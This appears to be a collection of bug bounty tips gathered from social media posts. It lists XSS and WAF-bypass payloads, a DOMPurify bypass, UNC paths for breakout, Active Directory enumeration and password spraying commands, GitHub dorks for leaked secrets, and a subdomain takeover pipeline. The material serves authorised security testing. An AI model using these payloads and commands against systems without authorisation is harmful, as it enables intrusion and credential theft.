## Tips



@PaulosYibelo

Disable/Bypass DOMPurify by abusing the XSSAuditor, site/?a=<script type="text/javascript" src="src/purify.js"></script> will block the script if the site doesn’t return X-XSS-Protection: 0;

------------------------------------


Having a breakout exercise and direct drive access is forbidden? Perhaps try these too:
\\localhost\d$
\\127.0.0.1\d$
file:\\127.0.0.1\d$
\\--1.ipv6-literal.net\d$
\\http://0--1.ipv6-literal.net\d$
\\--0-1.ipv6-literal.net\d$
file://--0-1.ipv6-literal.net\d$

---------------------------------------------

1) amass enum -config config.ini -brute -w all.txt
2) Identify hosts, not previously found.
3) gobuster -u http://example.com -w content_discovery_nullenc0de.txt
4) Read through the JS files gobuster found.
5) Browse to links identified in JS.
6) Download list of APIs/pass.

-----------------------------------------

WAF bypass w/ Tab html entity for obfuscation

XSS payload:
<iframe src=java&Tab;sc&Tab;ript:al&Tab;ert()></iframe>

Renders as:
<iframe src="java    sc    ript:al    ert()"></iframe>

--------------------------------------------


Here's a small #XSS list for manual testing (main cases, high success rate).

"><img src onerror=alert(1)>
"autofocus onfocus=alert(1)//
</script><script>alert(1)</script>
'-alert(1)-'
\'-alert(1)//
javascript:alert(1)

Try it on:
- URL query, fragment & path;
- all input fields.

------------------------------------------



Here's a regular expression for extracting variable names from JS. I'll be using the results for parameter fuzzing.

/(?<=(var|const|let) )([A-Za-z0-9_]+?)(?=(;|,|=| ))/g

It's far from perfect, but I'm not great with regex.


------------------------------------


Quick Tip: While you are trying to find more subdomains and you use the Google Dork:  site:*.example.com, NEVER forget to check
site:*.*.example.com and
site:*.*.*.example.com 


-------------------------------

Everything patched? Good baselines? Find NULL Sessions!
1) Find your DC's
nmap -sS -p3268,3269 -iL subnets.txt
2) Enumerate Users
enum4linux -U 192.168.x.x
3) Pull Password Policy
enum4linux -P 192.168.x.x
4) Password Spray Usernames
cme smb 192.168.x.x -u users.txt -p Summer2019

------------------------------------

Jin Wook Kim
@wugeej
[Guide Book] Bypassing CSRF Protection

1. Clickjacking
2. Change the request method
3. Delete the token param or send a blank token
4. Use another session’s CSRF token
5. Session fixation
6. CSRF Protection via Referer
7. Bypass the regex

-------------------------------
I bypassed an interesting xss protection with :
%3c<aa+ONLOAD+href=javasONLOADcript:promptONLOAD(1)%3e


https://twitter.com/sametsahinnet/status/1169223269708455944

---------------------------------------

hackbar plugin

https://twitter.com/CyberWarship/status/1169328352496365570

------------------------------------

Hussein Daher
@HusseiN98D
Analysis of an RCE I found past week. RT and Like if you want more! If you got a bug bounty program, I'm open to any invite :) #bugbounty #bugbountytip #bugbountytips #infosec

https://twitter.com/HusseiN98D/status/1170421494830305280

------------------------------------------

Recon Tip:

As javascript files are always full of secret information here is how to can use `grep` to extract comments inside JavaScript.

Example:

curl https://paypalobjects.com/api/checkout.js | grep '//'

-----------------------------------

XSS filter bypass using stripped </div> tags to obfuscate.  Multiple P2 Stored XSS on a private bug bounty program.

XSS Payload:
<</div>script</div>>alert()<</div>/script</div>

---------------------------------------------------


Dir scan on a subdomain -> Access to /api/admin HTTP 403 -> access to /api/admin.json HTTP 200 -> SMTP creds leaking -> no-reply company email takeover

Reported as a crit. Always try to add .json, you never know how the application router's going to behave #bugbountytips

-----------------------------------------------------------

#bugbountytips #bugbounty Top GitHub Dorks and Scan GitHub Repositories for Sensitive Data
password
dbpassword
dbuser
access_key
secret_access_key
bucket_password
redis_password
root_password
HOST=http://smtp.gmail.com
filename:.htpasswd
extension:sql mysql dump

----------------------------------------

/api POST Request 
 
&ul="><img+src=x+onerror=prompt(1);>.

/api Response
{
"errors": {
"ul": "Invalid value \"><img src=x onerror=prompt(1);>."
}
}

but no XSS "><"is being filtered with "&lt; &gt;"  is there any way to bypass these filters?

--------------------------------------------------------------------------

Quick and dirty way to find parameters vulnerable to LFI & Path Traversal & SSRF & Open Redirect:
Burp Search > Regex 
\?.*=(\/\/?\w+|\w+\/|\w+(%3A|:)(\/|%2F)|%2F|[\.\w]+\.\w{2,4}[^\w])

-----------------------

oneliner to open a bunch of hosts/urls #bugbountytips 

firefox `cat urls.txt | awk '{if(index($1,"http")){print $1}else{print "http://"$1;print "https://"$1}}' | tr "\n" " "`




firefox `cat urls.txt | awk '{if(index($1,"http")){print $1}else{print "http://"$1;print "https://"$1}}'
firefox `cat urls.txt | awk '{if(index($1,"http")){print $1}else{print "http://"$1;print "https://"$1}}' | tr "\n" " "`
 
chromium-browser `cat urls.txt | awk '{if(index($1,"http")){print $1}else{print "http://"$1;print "https://"$1}}'
chromium-browser `cat urls.txt | awk '{if(index($1,"http")){print $1}else{print "http://"$1;print "https://"$1}}' | tr "\n" " "`

-----------------------------------


Found easy xss

1. Subdomain enumeration
2. S3 bucket with access denied
3. Ffuf found -> /cdn/
4. Ffuf found -> /cdn/proxy.html
5. Blank page -> view source, found url param (document.location)
6. ?url=javascript:alert ()

--------------------------------------------


Account takeover
1. 1 account logged in 2 browsers
2. Tried signup with same account but showing email exist and redirect to signup page
3. In Firefox captured request of sign up submit >Do intercept > Response > Email exists

----------------------------------------------


Bug Bounty Tip for checking javascript files response which are stored in text file:

cat js_files_url_list.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk

-----------------------------------------

RCE story

http://1.site.com/admin
Forbidden
2.HTTP header in request - Login page access
3. Sqli queries tried no success
4. Some recon on gitlab - Found base64 pwd - decrypt
5. Accessed admin panel
6. Admin panel customized - CLI available
7. File read successful

---------------------------------------

<script>alert(1)</script> blocked by waf. 

Let's try <script>alert`1`</script

------------------------------------

find cname records

for ip in $(cat subdomain.txt);do dig asxf $ip | grep CNAME;done

------------------

evolution of an #xss WAF bypass 

<img src onerror=confirm(1)>

&gt;+src+onerror=confirm&lpar;1&rpar;&lt;

&gt;+src+onerror=confirm&amp;lpar;1&amp;rpar;&lt;

new tip: try double HTML entity encoding chars??? 

-----------------------------------------------------

Find subdomains and takeover
Grinning face with smiling eyes


subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/HAHWUL/tool/subjack/fingerprints.json -v 3 >> takeover ;